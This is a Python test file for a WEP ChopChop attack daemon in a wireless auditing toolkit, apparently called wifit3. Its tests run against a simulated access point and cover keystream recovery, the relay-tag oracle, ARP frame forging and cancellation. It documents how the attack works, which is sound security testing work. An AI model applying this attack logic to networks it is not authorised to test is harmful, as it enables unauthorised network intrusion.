"""Offline tests for the WEP ChopChop daemon.

The live oracle (does the AP relay?) is hardware-verified by the probe; here we
prove the OFFLINE-testable core — the byte-walk keystream recovery, the
tag-and-read-back identity mechanism, and the forge/handoff — by driving the
daemon with a SIMULATED AP (decrypt the shortened frame with a known key, relay
iff the ICV is valid, echoing back the MAC tag we stamped). If recovery
reproduces the true keystream against that, the attack logic is correct; only
the on-air relay path needs the box.
"""
from __future__ import annotations

import asyncio
import zlib
from types import SimpleNamespace

from wifit3.engine.attacks.wep.chopchop import (
    WepChopChop,
    _SENTINEL,
    _hdr_len,
)
from wifit3.engine.attacks.wep.wep_crypto import (
    CRC32_RESIDUE,
    arp_request_plaintext,
    chop_last_byte_and_fixup,
    icv,
)

OUR = bytes.fromhex("02aabbccddee")
BSSID = "11:22:33:44:55:66"
BSSID_B = bytes.fromhex("112233445566")
KEY = b"abcde"
IV = bytes([0x11, 0x22, 0x33])


def _rc4(key: bytes, n: int) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(n)
    i = j = 0
    for k in range(n):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[k] = s[(s[i] + s[j]) & 0xFF]
    return bytes(out)


_SNAP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])


def _arp_cipher(sender_ip, target_ip):
    """Build a realistic captured ARP cipher + its true keystream."""
    pt = arp_request_plaintext(sender_mac=OUR, sender_ip=sender_ip,
                               target_ip=target_ip)
    plain = pt + icv(pt)                       # 36 + 4 = 40
    ks = _rc4(IV + KEY, len(plain))
    cipher = bytes(p ^ k for p, k in zip(plain, ks))
    return cipher, ks


def _ip_cipher():
    """Build a captured broadcast IP datagram cipher: SNAP + ethertype 0x0800 +
    a well-formed IPv4 header (IHL=5, TOS=0) + payload. The IP total-length
    field equals (cipher_len - 12) by construction — exactly what header_rec
    computes — so the offline reconstruction can confirm it via the CRC."""
    ip_len = 40                                          # 20 hdr + 20 payload
    ip_hdr = bytes([0x45, 0x00, (ip_len >> 8) & 0xFF, ip_len & 0xFF,
                    0x12, 0x34,            # identification
                    0x40, 0x00,            # flags/frag (DF)
                    0x40, 0x11,            # TTL=64, proto=UDP
                    0xAB, 0xCD,            # header checksum (don't care here)
                    10, 0, 0, 5,           # src IP
                    10, 0, 0, 255])        # dst IP (a broadcast)
    datagram = ip_hdr + bytes(ip_len - 20)               # 40 bytes total
    plain = _SNAP + bytes([0x08, 0x00]) + datagram       # 8 + 40 = 48
    full = plain + icv(plain)                            # 52
    ks = _rc4(IV + KEY, len(full))
    cipher = bytes(p ^ k for p, k in zip(full, ks))      # n = 52 → totlen 40
    return cipher, ks


def _sim_oracle(iv: bytes, key: bytes):
    """Stand in for the AP at the abstract oracle level: return the (unique)
    guess whose chopped+fixed frame has a valid ICV — exactly the byte the AP
    would relay. None if none do."""
    async def oracle(body: bytes):
        for g in range(256):
            short = chop_last_byte_and_fixup(body, g)
            kstream = _rc4(iv + key, len(short))
            plain = bytes(c ^ k for c, k in zip(short, kstream))
            if (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE:
                return g
        return None
    return oracle


def _daemon(oracle=None):
    calls = []
    iface = SimpleNamespace(
        register_rx_callback=lambda c: None,
        unregister_rx_callback=lambda c: None,
    )
    d = WepChopChop(
        iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
        source_mac=OUR, on_forged_arp=lambda f: calls.append(f), oracle=oracle,
    )
    d._active = True
    d._cur_iv, d._cur_keyid = IV, 0
    return d, calls


# ---- byte-walk: linear recovery, identity read from each relay -------------

def _assert_valid_forged_arp(forged: bytes):
    """The forged frame decrypts (key abcde) to a well-formed broadcast ARP
    from us with a valid ICV — i.e. one the AP will relay."""
    body = forged[_hdr_len(forged[0], forged[1]):]
    assert forged[16:22] == b"\xff" * 6          # broadcast DA (a real ARP req)
    assert body[:3] == IV                        # reused the target's IV
    plain = bytes(c ^ k for c, k in zip(body[4:], _rc4(IV + KEY, len(body) - 4)))
    snap_arp = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
    assert plain[:8] == snap_arp
    assert plain[16:22] == OUR                   # sender = our STA
    assert plain[-4:] == icv(plain[:-4])         # valid ICV


async def test_chop_and_forge_recovers_and_forges_valid_arp():
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    d, _ = _daemon(oracle=_sim_oracle(IV, KEY))
    forged = await d._chop_and_forge(cipher)
    assert forged is not None
    _assert_valid_forged_arp(forged)


async def test_chop_and_forge_none_when_ap_silent():
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))

    async def never(_body):
        return None
    d, _ = _daemon(oracle=never)
    # No byte relays at full length → gap is the whole tail (>1 byte) → give up.
    assert await d._chop_and_forge(cipher) is None


async def test_chop_and_forge_aborts_on_relayed_sentinel():
    """If the AP relays the bad-ICV sentinel, it doesn't discard invalid frames
    — chopchop can't work; we bail (and log), not loop forever."""
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    logs = []

    async def sentinel(_body):
        return _SENTINEL
    d, _ = _daemon(oracle=sentinel)
    d._log = logs.append
    assert await d._chop_and_forge(cipher) is None
    assert any("bad-ICV" in m for m in logs)


# ---- tag-and-read-back via a SIMULATED relaying AP (the live mechanism) -----

def _relaying_iface(key: bytes, daemon_box, min_relay: int = 0):
    """A fake iface whose send_raw plays the AP: decrypt the sent frame's WEP
    body; if the ICV is valid, 'relay' it back as a FromDS frame echoing the DA
    tag we stamped — exactly how the daemon learns which guess was accepted.
    ``min_relay`` models the drop-short wall: ciphers shorter than it are
    dropped (never relayed), so the chop stalls there."""
    box = {}

    async def send_raw(frame, use_no_ack=False, sw_seq=None):
        d = box["d"]
        da = frame[16:22]                       # Addr3 (DA) of our ToDS frame
        body = frame[24:]
        ct = body[4:]                           # skip IV(3)+KeyID(1)
        if len(ct) < min_relay:                 # too short → the AP drops it
            return
        plain = bytes(c ^ k for c, k in zip(ct, _rc4(IV + key, len(ct))))
        if (zlib.crc32(plain) & 0xFFFFFFFF) != CRC32_RESIDUE:
            return                              # bad ICV → AP drops it
        # Relay: FromDS, Addr1=DA(tag), Addr2=BSSID, Addr3=SA(our STA).
        relay = (bytes([0x08, 0x42, 0, 0]) + da + BSSID_B + OUR
                 + b"\x00\x00" + body)
        d._rx_cb(relay, -40, 0.0)

    box["d"] = daemon_box
    return SimpleNamespace(register_rx_callback=lambda c: None,
                           unregister_rx_callback=lambda c: None,
                           send_raw=send_raw), box


async def test_tag_and_read_back_recovers_keystream_end_to_end():
    """The whole new mechanism, offline: the daemon stamps each guess into the
    DA, the simulated AP relays only the valid-ICV one (echoing that DA), and
    the daemon reads the guess back out of the relay's Addr1 — no inference,
    no DFS — recovering the keystream and forging a valid ARP."""
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    holder = {}
    iface, box = _relaying_iface(KEY, None)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
                    source_mac=OUR, on_forged_arp=lambda f: holder.setdefault("f", f))
    box["d"] = d
    d._active = True
    d._cur_iv, d._cur_keyid = IV, 0
    d._SEND_INTERVAL_S = 0          # don't pace the test
    d._DRAIN_S = 0
    forged = await d._chop_and_forge(cipher)
    assert forged is not None
    _assert_valid_forged_arp(forged)


def _walled_daemon(cipher_key, min_relay):
    """A daemon wired to a simulated AP that walls at ``min_relay`` (drop-short)
    — for the wall paths: AP-brute (ARP) and IP header reconstruction."""
    holder = {}
    iface, box = _relaying_iface(cipher_key, None, min_relay=min_relay)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
                    source_mac=OUR,
                    on_forged_arp=lambda f: holder.setdefault("f", f))
    box["d"] = d
    d._active = True
    d._cur_iv, d._cur_keyid = IV, 0
    d._SEND_INTERVAL_S = 0
    d._DRAIN_S = 0
    return d


async def test_chop_to_wall_then_ap_brute_recovers_boundary_byte():
    """The AP walls just inside the sender MAC (won't relay a 16-byte cipher):
    chopping stalls at 17, leaving the ARP header known [0..15] and ONE unknown
    byte [16] — recovered by the forged-ARP AP-brute, then CRC-confirmed."""
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    d = _walled_daemon(KEY, min_relay=17)
    forged = await d._chop_and_forge(cipher)
    assert forged is not None
    _assert_valid_forged_arp(forged)


async def test_recovers_ip_seed_via_header_reconstruction():
    """A broadcast IP datagram (not ARP) where the AP relays down to a 12-byte
    cipher: chopping recovers bytes 12..end, and the hidden IP header [0..11] is
    reconstructed offline (brute version/IHL + TOS, computed total-length,
    confirmed by the frame's own CRC) — then we forge the usual broadcast ARP."""
    cipher, _ = _ip_cipher()
    d = _walled_daemon(KEY, min_relay=12)
    forged = await d._chop_and_forge(cipher)
    assert forged is not None
    _assert_valid_forged_arp(forged)


async def test_loop_picks_seed_from_store_and_chops_end_to_end():
    """Drive the real _loop (not just _chop_and_forge): it must pull a seed from
    the store's chop_candidates, associate, chop, and hand off — without
    referencing anything that no longer exists. Regression for the lazy-auth
    refactor leaving a stale self._can_inject() in the loop, which crashed the
    task on its first tick (chop_active stayed True so the UI showed 'forging a
    seed' while nothing actually chopped)."""
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    hdr = (bytes([0x08, 0x42, 0, 0]) + b"\xff" * 6 + BSSID_B + OUR
           + b"\x00\x00")
    frame = hdr + IV + b"\x00" + cipher                  # 68B captured broadcast
    holder = {}
    iface = SimpleNamespace(register_rx_callback=lambda c: None,
                            unregister_rx_callback=lambda c: None)
    store = SimpleNamespace(chop_candidates=lambda b: [frame])
    logs: list[str] = []
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID), store,
                    source_mac=OUR,
                    on_forged_arp=lambda f: holder.setdefault("f", f),
                    log_callback=logs.append,
                    oracle=_sim_oracle(IV, KEY))
    d.start()
    try:
        await asyncio.wait_for(d._task, timeout=2.0)     # re-raises a loop crash
    finally:
        d.stop()
    assert "f" in holder
    _assert_valid_forged_arp(holder["f"])
    # Tree-log shape: a plain "ChopChopping packet" header, then a └─✓ leaf.
    assert any("ChopChopping packet" in m and not m.startswith(" ") for m in logs)
    assert any("└─" in m and "ChopChop packet forged" in m for m in logs)


def test_treelog_connectors():
    from wifit3.engine.attacks.wep import treelog
    assert treelog.branch("x") == " [dim]├─►[/dim] x"
    ok = treelog.leaf_ok("x")
    assert ok.startswith(" [dim]└─[/dim]") and "✓" in ok and ok.endswith(" x")
    bad = treelog.leaf_fail("x")
    assert bad.startswith(" [dim]└─[/dim]") and "╳" in bad


async def test_succeed_hands_forged_arp_to_campaign_and_stops():
    cipher, _ = _arp_cipher(bytes([192, 168, 1, 50]), bytes([192, 168, 1, 1]))
    d, calls = _daemon(oracle=_sim_oracle(IV, KEY))
    forged = await d._chop_and_forge(cipher)
    d._succeed(forged)
    assert d.is_active is False                  # immediate handoff stopped it
    assert calls == [forged]
    _assert_valid_forged_arp(calls[0])


# ---- stop() halts an in-flight walk (campaign Stop IVs tears chop down) ----

async def test_stop_halts_an_in_flight_byte_walk():
    """Regression: clicking Stop IVs calls campaign.stop() → chop.stop(); the
    long byte-walk must actually end (not orphan after the buttons hide)."""
    captured = (bytes([0x08, 0x42, 0, 0]) + b"\xff" * 6
                + bytes.fromhex("aa:bb:cc:dd:ee:06") + OUR + b"\x00\x00"
                + IV + b"\x00" + bytes(40))               # 68B broadcast WEP

    async def slow(_body):            # never relays → keeps the walk going
        await asyncio.sleep(0.01)
        return None

    iface = SimpleNamespace(register_rx_callback=lambda c: None,
                            unregister_rx_callback=lambda c: None)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID),
                    SimpleNamespace(chop_candidates=lambda b: [captured]),
                    source_mac=OUR, on_forged_arp=lambda f: None, oracle=slow)
    d.start()
    await asyncio.sleep(0.02)         # let the walk get in-flight
    assert d.is_active
    task = d._task
    d.stop()
    await asyncio.sleep(0.05)         # let the cancellation deliver
    assert not d.is_active
    assert task.done()               # the loop actually ended (no orphan)


# ---- the live-AP RX matcher: read the guess out of the relay's MAC tag ------

def _relay_frame(tag: bytes, guess: int, sa=OUR, fc1=0x42, fc0=0x08):
    """A FromDS data frame whose Addr1 (RA) is the multicast tag we stamped."""
    b1 = (tag[0] & 0xFE) | (0 if guess == _SENTINEL else 1)
    addr1 = bytes([0xFF, b1, tag[1], tag[2], tag[3], guess & 0xFF])
    return (bytes([fc0, fc1]) + b"\x00\x00" + addr1 + BSSID_B + sa
            + b"\x00\x00" + b"\xab\xcd\xef\x00" + b"\x00" * 40)


def test_rx_reads_guess_from_tagged_relay():
    d, _ = _daemon()
    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
    d._rx_cb(_relay_frame(d._cur_tag, 0x6B), -40, 0.0)
    assert d._relayed_guess == 0x6B
    assert not d._sentinel_relayed


def test_rx_ignores_relay_with_a_different_tag():
    """A stale relay from the PREVIOUS byte carries that position's (different)
    random tag → must be ignored (this is what killed the old echo bug)."""
    d, _ = _daemon()
    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
    other = bytes([0x12, 0x99, 0x56, 0x78])           # byte-1 differs
    d._rx_cb(_relay_frame(other, 0x6B), -40, 0.0)
    assert d._relayed_guess is None


def test_rx_ignores_non_matching():
    d, _ = _daemon()
    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
    d._rx_cb(_relay_frame(d._cur_tag, 0x6B, sa=bytes.fromhex("020000000099")),
             -40, 0.0)                                 # SA not us
    assert d._relayed_guess is None
    d._rx_cb(_relay_frame(d._cur_tag, 0x6B, fc1=0x41), -40, 0.0)   # ToDS
    assert d._relayed_guess is None
    d._rx_cb(_relay_frame(d._cur_tag, 0x6B, fc0=0x80), -40, 0.0)   # mgmt
    assert d._relayed_guess is None


def test_rx_relayed_sentinel_flags_non_vulnerable_ap():
    """A relayed sentinel (byte-1 LSB clear) means the AP forwarded a bad-ICV
    frame → set the flag, do NOT treat its address byte as a recovered guess."""
    d, _ = _daemon()
    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
    d._rx_cb(_relay_frame(d._cur_tag, _SENTINEL), -40, 0.0)
    assert d._sentinel_relayed
    assert d._relayed_guess is None
